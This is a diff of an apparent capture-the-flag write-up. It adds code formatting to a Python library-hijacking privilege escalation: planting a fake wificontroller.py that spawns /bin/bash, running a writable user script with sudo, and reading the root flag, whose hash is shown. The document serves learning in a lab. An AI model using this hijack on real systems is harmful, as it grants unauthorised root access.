@@ -5,16 +5,30 @@ when python imports a module, it searches in the following order
 3. system-wide python libraries
 
 # 1. Check the script contents  
+
+```
 cat /home/walter/wifi_reset.py
+```
 
 # 2. Check current directory permissions  
+
+```
 ls -la /home/walter/# 3. If /home/walter/ is writable, create malicious wificontroller.py  
-cd /home/walter/  
-echo 'import os; os.system("/bin/bash")' > wificontroller.py# 4. Run the script with sudo  
+cd /home/walter/ 
+```
+
+``` 
+echo 'import os; os.system("/bin/bash")' > wificontroller.py
+```
+
+# 4. Run the script with sudo  
+```
 sudo /usr/bin/python /home/walter/wifi_reset.py
+```
 
 so we can just make a fake one and we get it
 
+```
 www-data@walla:/home/walter$ ls -la /home/walter/  
 ls -la /home/walter/  
 total 28  
@@ -37,3 +51,4 @@ find / -name "proof.txt" 2>/dev/null
 /root/proof.txt  
 cat /root/proof.txt  
 1be0f2f93b4707f0dd101fb93431353c
+```
